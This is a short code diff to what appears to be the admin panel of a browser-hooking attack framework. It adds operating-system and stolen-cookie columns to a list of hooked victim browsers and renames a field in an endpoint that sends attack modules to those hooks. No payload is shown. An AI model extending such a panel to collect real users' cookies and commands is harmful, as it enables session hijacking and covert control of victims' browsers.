@@ -40,7 +40,7 @@ class AttacksView(BaseView):
 
     @expose('/command', methods=['POST'])
     def command_update(self):
-        id = request.form.get('id')
+        id = request.form.get('hook_id')
         module = request.form.get('module')
 
         if not id or not module:
@@ -65,13 +65,15 @@ class CommandAdminView(AuthModelView):
     column_labels = {'hook_id': 'Hook ID'}
 
 class HookAdminView(AuthModelView):
-    column_list = ('id', 'ip_address', 'user_agent', 'screen_resolution', 'browser_plugins', 'language', 'timezone', 'last_update')
+    column_list = ('id', 'ip_address', 'os', 'user_agent', 'screen_resolution', 'browser_plugins', 'cookies', 'language', 'timezone', 'last_update')
     column_labels = {
         'id': 'Hook ID',
         'ip_address' : 'IP Address',
+        'os' : 'Operating System',
         'user_agent' : 'User Agent',
         'screen_resolution' : 'Screen Resolution',
         'browser_plugins' : 'Browser Plugins',
+        'cookies' : 'Cookies',
         'language' : 'Language',
         'timezone' : 'Timezone',
         'last_update' : 'Last Update'
